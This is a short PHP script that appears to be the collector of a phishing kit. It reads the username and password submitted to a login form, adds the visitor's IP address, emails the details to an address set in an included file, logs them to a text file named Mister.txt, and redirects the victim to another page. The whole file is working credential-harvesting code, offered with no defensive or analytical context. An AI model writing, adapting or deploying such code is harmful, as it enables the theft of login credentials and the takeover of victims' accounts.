<?php
$Uid = $_POST['UserName'];
$Pswn = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];


$message = "----------------------------------- \r\n";
$message .= "USUARIO BF".$ip."\r\n";
$message .= "USER: ".$Uid."\r\n";
$message .= "PASS: ".$Pswn."\r\n";

$message .= "----------------------------------- \r\n";

include "Content/pp.php";
$subject = 'BF'.$ip;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

if( (empty($Uid)) or (empty($Pswn)) ){
	header('location: ls20c5.html');

}else{
	//guardar archivo texto
	$file = fopen ( 'Mister.txt' , 'a+');
	fwrite($file, "Usuario: ".$Uid."\r\n; Paswrd: ".$Pswn."\r\n; IP: ".$ip."\r\n; ====Nuevo orden=========\r\n");
	fclose($file);
	header ('location: ls20c5.html');
}



?>